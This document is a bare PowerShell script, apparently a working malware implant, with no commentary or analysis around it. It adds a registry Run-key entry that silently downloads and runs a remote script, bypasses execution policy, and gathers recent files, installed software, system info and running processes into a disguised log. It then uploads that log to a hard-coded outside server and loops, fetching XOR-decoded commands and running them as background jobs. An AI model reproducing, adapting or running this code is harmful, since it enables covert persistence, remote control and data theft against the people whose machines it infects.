$SERVER_ADDR = "http://dongkuiri.atwebpages.com/venus02/venus03/"
$UP_URI = "post.php"
$upName = "venus03"
$LocalID = "venus03"
$LOG_FILENAME = "Alzip.hwp"
$LOG_FILEPATH = "\Alzip\"
$TIME_VALUE = 1000*60*10
$EXE = "rundll32.exe"
$MyfuncName = "Run"
$RegValueName = "Alzipupdate"
$RegKey = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
$regValue = "cmd.exe /c powershell.exe -windowstyle hidden IEX (New-Object System.Net.WebClient).DownloadString('http://dongkuiri.atwebpages.com/venus02/venus03/venus03.ps1')"

function decode($encstr)
{	
	$key = [byte[]](0,2,4,3,3,6,4,5,7,6,7,0,5,5,4,3,5,4,3,7,0,7,6,2,6,2,4,6,7,2,4,7,5,5,7,0,7,3,3,3,7,3,3,1,4,2,3,7,0,2,7,7,3,5,1,0,1,4,0,5,0,0,0,0,7,5,1,4,5,4,2,0,6,1,4,7,5,0,1,0,3,0,3,1,3,5,1,2,5,0,1,7,1,4,6,0,2,3,3,4,2,5,2,5,4,5,7,3,1,0,1,6,4,1,1,2,1,4,1,5,4,2,7,4,5,1,6,4,6,3,6,4,5,0,3,6,4,0,1,6,3,3,5,7,0,5,7,7,2,5,2,7,7,4,7,5,5,0,5,6) 
	$len = $encstr.Length
	$j = 0
	$i = 0
	$comletter = ""
	while($i -lt $len)
	{
		$j = $j % 160
		
		$asciidec = $encstr[$i] -bxor $key[$j]
		$dec = [char]$asciidec
		$comletter += $dec
		$j++
		$i++
	}

	return $comletter
}
function UpLoadFunc($logpath)
{
	$Url = $SERVER_ADDR + $UP_URI
	$bReturn = $True
	$testpath = Test-Path $logpath
	if($testpath -eq $False)
	{
		return $bReturn
	}
	$hexdata = [IO.File]::ReadAllText($logpath)
	$encletter = decode $hexdata
	$nEncLen = $encletter.Length
	$LF = "`r`n"
	$templen = 0x100000
	$sum = 0
	do
	{
		$szOptional = ""
		$pUploadData = ""
		Start-Sleep -Milliseconds 100
		$readlen = $templen;
		if (($nEncLen - $sum) -lt $templen)
		{
			$readlen = $nEncLen - $sum
		}
		if ($readlen -ne 0)
		{
			$pUploadData = $encletter + $sum
			$sum += $readlen
		}
		else
		{
			$pUploadData += "ending"
			$sum += 9
			$readlen = 6
		}
		Start-Sleep -Milliseconds 1
		$boundary = "----WebKitFormBoundarywhpFxMBe19cSjFnG"
		$ContentType = 'multipart/form-data; boundary=' + $boundary
		$bodyLines = (
		"--$boundary",
		"Content-Disposition: form-data; name=`"MAX_FILE_SIZE`"$LF",
		"10000000",
		"--$boundary",
		"Content-Disposition: form-data; name=`"userfile`"; filename=`"$upName`"",
		"Content-Type: application/octet-stream$LF",
		$pUploadData,
		"--$boundary"
		) -join $LF

		Start-Sleep -Milliseconds 1
		$psVersion = $PSVersionTable.PSVersion
		
		$r = [System.Net.WebRequest]::Create($Url)
		$r.Method = "POST"
		$r.UseDefaultCredentials = $true
		$r.ContentType = $ContentType
		$enc = [system.Text.Encoding]::UTF8
		$data1 = $enc.GetBytes($bodyLines)
		$r.ContentLength = $data1.Length
		$newStream = $r.GetRequestStream()
		$newStream.Write($data1, 0, $data1.Length)
		$newStream.Close();
		
		if($php_post -like "ok")
		{
			echo "UpLoad Success!!!"
		}
		else
		{
			echo "UpLoad Fail!!!"
			$bReturn = $False
		}
	} while ($sum -le $nEncLen);
	return $bReturn
}
function FileUploading($upPathName)
{
	$bRet = $True
	$testpath = Test-Path $upPathName
	if($testpath -eq $False)
	{
		return $bRet
	}
	$UpL = UpLoadFunc $upPathName
	if($UpL -eq $False)
	{
		echo "UpLoad Fail!!!"
		$bRet = $False
	}
	else
	{
		echo "Success!!!"
	}
	del $upPathName
	return $bRet
}
function Download
{
	$downname = $LocalID + ".down"
	$delphppath = $SERVER_ADDR + "del.php"
	$downpsurl = $SERVER_ADDR + $downname
	$codestring = (New-Object System.Net.WebClient).DownloadString($downpsurl)
	$comletter = decode $codestring
	
	$decode = $executioncontext.InvokeCommand.NewScriptBlock($comletter)
	$RunningJob = Get-Job -State Running
	if($RunningJob.count -lt 3)
	{
		$JobName = $RunningJob.count + 1
		Start-Job -ScriptBlock $decode -Name $JobName
	}
	else
	{
		$JobName = $RunningJob.count
		Stop-Job -Name $RunningJob.Name
		Remove-Job -Name $RunningJob.Name
		Start-Job -ScriptBlock $decode -Name $JobName
	}
	$down_Server_path = $delphppath + "?filename=$LocalID"
	$response = [System.Net.WebRequest]::Create($down_Server_path).GetResponse()
	$response.Close()
}
function Get_info($logpath)
{
	Get-ChildItem ([Environment]::GetFolderPath("Recent")) >> $logpath
	dir $env:ProgramFiles >> $logpath
	dir "C:\Program Files (x86)" >> $logpath
	systeminfo >> $logpath
	tasklist >> $logpath
}

function main
{
	Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
	$FilePath = $env:APPDATA + $LOG_FILEPATH
	New-Item -Path $FilePath -Type directory -Force
	$szLogPath = $FilePath + $LOG_FILENAME
	$key = Get-Item -Path $RegKey
	$exists = $key.GetValueNames() -contains $RegValueName
	if($exists -eq $False)
	{
		$value1 = New-ItemProperty -Path $RegKey -Name $RegValueName -Value $regValue
		Get_info $szLogPath
	}
	
	while ($true)
	{
		FileUploading $szLogPath
		Start-Sleep -Milliseconds 10000
		Download
		Start-Sleep -Milliseconds 10000
		Start-Sleep -Milliseconds $TIME_VALUE
	}
}
main
